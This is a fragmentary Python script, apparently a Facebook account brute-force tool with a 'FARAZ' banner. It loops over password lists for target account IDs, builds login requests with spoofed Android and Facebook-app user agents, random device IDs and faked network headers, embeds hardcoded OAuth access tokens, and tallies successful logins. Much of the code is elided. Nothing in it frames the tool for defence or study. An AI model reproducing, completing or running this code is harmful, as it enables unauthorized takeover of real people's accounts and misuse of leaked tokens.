...
def logo():
    print("""      \33[1;37md88888b  .d8b.  d8888b.  .d8b.  d88888D 
                ...
                try:
                        ...
                        for pw in passlist:
                                ...
                                head = {
                                        ...
                                        'Authorization':'OAuth EAAGOfOcFdnYBAAYuMJa0HR1O3CG5qXZC6I6cy4tjzMxE1O3LYNn2caydfeKiI7jiR2pZALg7Ekjk9rltoME9xiIhmMnKko7asxSpdqMWyJ5ZCeKiv9ISgSVE82iZCAWgngT4H3ab7k3mHPzxaUNlrdlxDzEinlc0nIOJOwI9X6zrqoUMG6yh',
                        ...
                        pass# M1
"""
Mozilla/5.0 (Linux; Android 12; 2107113SG Build/SKQ1.211006.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/415.0.0.34.107;]
Mozilla/5.0 (Linux; Android 12; moto e32(s) Build/STBS32.36-99-1-6) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.5672.131 Mobile Safari/537.36 GNews Android/2022131834
...
def api1(ids,names,passlist):
                try:
                        global ok,loop
                        sys.stdout.write(f'\r\r\033[1;37m [FARAZ-M2] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        fn = names.split(f' ')[0]
                        try:
                                ln = names.split(f' ')[1]
                        except:
                        ...
                        for pw in passlist:
                                ...
                                gttt=random.choice(xxxxx)
                                android_version=str(random.randrange(6,13))
                                ua_string = "Dalvik/2.1.0 (Linux; U; Android 10; Infinix X656 Build/QP1A.190711.020) [FBAN/MobileAdsManagerAndroid;FBAV/324.0.0.28.115;FBBV/464692125;FBRV/0;FBPN/com.facebook.adsmanager;FBLC/en_US;FBMF/INFINIX MOBILITY LIMITED;FBBD/Infinix;FBDV/Infinix X656;FBSV/10;FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1424};FB_FW/1;]"
                                device_id = str(uuid.uuid4())
                                adid = str(uuid.uuid4())
                                data = {'adid':adid,
                                        'email':ids,
                                ...
                                head = {
                                        ...
                                        'x-fb-sim-hni':str(random.randint(2e4,4e4)),
                                        'x-fb-connection-type':'unknown',
                                        'Authorization':'OAuth EAAGOfOcFdnYBAMZAAnqYaGYLy8qUMCgboBC4viDo1NataajrhTUUdv3eqETNCgq4iZCXdJnjZBIRMnFa8od2JzjQyUVdoXnw9HH9xFCvqsGH5KwjAXIZAXcrI9sB8S9OLBRN3ZCpdbDbYYYywdF6bN326e2n8LxDeZCMWUh2cV6ZAV4hdl6vx7K',
                                        'user-agent':ua_string,
                                        'x-fb-net-hni':str(random.randint(2e4,4e4)),
                                        'x-fb-connection-bandwidth':str(random.randint(2e7,3e7)),
                                        'x-fb-connection-quality':'EXCELLENT',
